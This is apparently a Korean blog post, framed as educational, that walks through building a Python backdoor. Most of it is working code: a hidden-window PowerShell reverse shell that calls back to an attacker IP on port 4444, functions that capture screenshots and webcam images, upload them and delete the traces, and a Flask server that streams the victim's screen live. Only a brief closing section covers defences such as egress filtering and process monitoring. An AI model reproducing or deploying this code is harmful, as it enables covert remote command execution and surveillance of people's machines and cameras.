---
title: "파이썬으로 구현하는 리버스 쉘과 백도어 시스템 (교육용)"
date: 2026-04-24
category: Security
tags: [Python, Reverse Shell, Backdoor, Security, Ethical Hacking, Flask]
summary: "리버스 쉘의 기본 원리부터 스크린샷 탈취, 실시간 화면 스트리밍까지 파이썬으로 구현한 백도어 프로젝트를 통해 보안 취약점을 이해해 봅니다."
---

# 파이썬 기반 백도어 및 파일 전송 프로젝트

보안 학습에 있어 공격 기법을 이해하는 것은 방어 전략을 세우는 데 필수적입니다. 이번 포스트에서는 파이썬을 활용해 구현한 **리버스 쉘(Reverse Shell)** 백도어 프로젝트의 단계별 발전 과정과 실시간 화면 공유 시스템에 대해 알아보겠습니다.

---

### 1. 리버스 쉘(Reverse Shell)의 기초

일반적인 쉘 접속과 달리, **리버스 쉘**은 타겟(Target)이 공격자(Attacker)에게 접속을 시도하는 방식입니다. 타겟 PC의 방화벽이 외부 유입은 차단해도 내부 발신 연결은 허용하는 경우가 많다는 점을 이용합니다.

**핵심 코드 (`nc.py`):**
```python
import socket
import subprocess
import time

ip = "192.168.186.128" # 공격자 IP
port = 4444

while True:
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((ip, port))
        while True:
            data = client_socket.recv(4096)
            if not data: break
            
            # PowerShell을 사용하여 수신된 명령어 실행
            proc = subprocess.Popen(
                ["powershell.exe", data.decode("utf-8").strip()],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW # 창 숨김
            )
            stdout, stderr = proc.communicate()
            client_socket.sendall((stdout + stderr).encode())
    except Exception as e:
        time.sleep(3) # 연결 실패 시 재시도
    finally:
        client_socket.close()
```

---

### 2. 기능 확장: 스크린샷 및 웹캠 탈취

단순한 명령어 실행을 넘어, 타겟의 정보를 시각적으로 획득하는 기능을 추가할 수 있습니다. `Pillow`와 `OpenCV` 라이브러리를 활용합니다.

**스크린샷 및 웹캠 캡처 (`nc3.py` 중 일부):**
```python
from PIL import ImageGrab
import cv2
import requests

# 스크린샷 캡처 함수
def capture_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_path = os.path.join(tempfile.gettempdir(), "s.png")
    screenshot.save(screenshot_path, "PNG")
    return screenshot_path

# 웹캠 캡처 함수
def capture_webcam():
    cam = cv2.VideoCapture(0)
    result, image = cam.read()
    if result:
        path = os.path.join(tempfile.gettempdir(), "w.png")
        cv2.imwrite(path, image)
        return path
    return None

# 파일 서버 전송 함수
def send_to_server(file_path, upload_url):
    with open(file_path, "rb") as f:
        requests.post(upload_url, files={"file": (os.path.basename(file_path), f)})
    os.remove(file_path) # 흔적 제거
```

---

### 3. 실시간 모니터링: Flask 화면 스트리밍

스크린샷을 한 장씩 찍는 대신, Flask 웹 서버를 타겟 PC에서 실행하여 실시간으로 화면을 스트리밍할 수도 있습니다. `pyautogui`로 화면을 지속적으로 캡처하고 MJPEG 방식으로 송출합니다.

**실시간 스트리밍 서버 (`screen_share/app.py`):**
```python
from flask import Flask, Response, render_template
import pyautogui
import numpy as np
import cv2
import time

app = Flask(__name__)

def stream_screen():
    while True:
        # 화면 캡처 및 이미지 변환
        screen = pyautogui.screenshot()
        frame = np.array(screen)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        
        # JPEG 인코딩 및 스트림 생성
        ret, buffer = cv2.imencode(".jpg", frame)
        frame_bytes = buffer.tobytes()
        yield (b"--frame\r\n"
               b"Content-Type: image/jpeg\r\n\r\n" + frame_bytes + b"\r\n")
        time.sleep(0.1) # 프레임 속도 조절

@app.route("/screen_feed")
def screen_feed():
    return Response(stream_screen(), 
                    mimetype="multipart/x-mixed-replace; boundary=frame")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

---

### 4. 방어 관점에서의 교훈

이러한 백도어 공격을 방어하기 위해서는 다음과 같은 보안 조치가 필요합니다.

1. **에드그레스 필터링(Egress Filtering)**: 내부에서 외부로 나가는 트래픽 중 허용되지 않은 포트(예: 4444, 5000)를 차단합니다.
2. **이상 행위 탐지**: `powershell.exe`가 부모 프로세스 없이 실행되거나, 알 수 없는 외부 IP와 지속적으로 통신하는지 모니터링합니다.
3. **권한 관리**: 일반 사용자가 시스템 명령어나 카메라 API에 접근하지 못하도록 최소 권한 원칙을 적용합니다.

### ⚠️ 주의 사항
본 자료는 **교육 및 연구 목적**으로 작성되었습니다. 승인되지 않은 시스템에 대한 테스트는 명백한 불법 행위이며, 모든 책임은 실행자에게 있습니다.
